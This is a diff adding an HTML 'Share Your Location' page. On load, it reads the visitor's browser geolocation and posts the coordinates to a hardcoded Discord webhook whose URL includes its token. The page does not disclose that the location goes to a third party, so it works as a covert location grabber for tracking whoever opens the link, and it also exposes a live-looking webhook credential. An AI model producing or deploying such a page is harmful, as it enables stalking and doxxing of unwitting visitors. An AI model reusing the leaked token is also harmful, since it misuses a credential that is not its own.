@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Sharing</title>
+</head>
+<body>
+    <h1>Share Your Location</h1>
+    <p>The page will automatically request your location:</p>
+
+    <script>
+        // Function to send the location data to the Discord webhook.
+        function sendLocationToWebhook(latitude, longitude) {
+            const data = {
+                content: `Latitude: ${latitude}, Longitude: ${longitude}`,
+            };
+
+            // Send the data to the Discord webhook.
+            fetch('https://discord.com/api/webhooks/1168207172228874283/WI8jAK5kW7E4qUpihgBiprmAjCJ4GLumiUz4bNpl867_RXx7pDggYSVdkCq3L0kwukNB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Location sent successfully');
+                } else {
+                    alert('Error sending location');
+                }
+            })
+            .catch(error => {
+                alert('Error: ' + error);
+            });
+        }
+
+        // Function to get the user's location when the page loads.
+        function getLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendLocationToWebhook(latitude, longitude);
+                });
+            } else {
+                alert("Geolocation is not available in your browser.");
+            }
+        }
+
+        // Automatically call getLocation() when the page loads.
+        getLocation();
+    </script>
+</body>
+</html>
